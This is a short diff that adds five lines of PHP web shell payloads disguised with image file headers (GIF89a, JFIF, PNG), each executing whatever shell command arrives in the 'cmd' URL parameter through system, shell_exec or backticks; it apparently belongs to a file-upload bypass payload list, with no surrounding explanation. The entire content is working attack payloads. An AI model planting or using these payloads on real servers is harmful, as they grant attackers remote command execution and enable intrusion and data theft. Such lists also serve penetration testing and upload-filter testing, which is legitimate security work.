@@ -1,0 +1,5 @@
+GIF89a;<?php system($_GET['cmd']); ?>
+GIF89a<?=`$_GET[cmd]`?>
+GIF89a<?php echo shell_exec($_GET['cmd']); ?>
+JFIF<?php system($_GET['cmd']); ?>
+PNG<?php system($_GET['cmd']); ?>
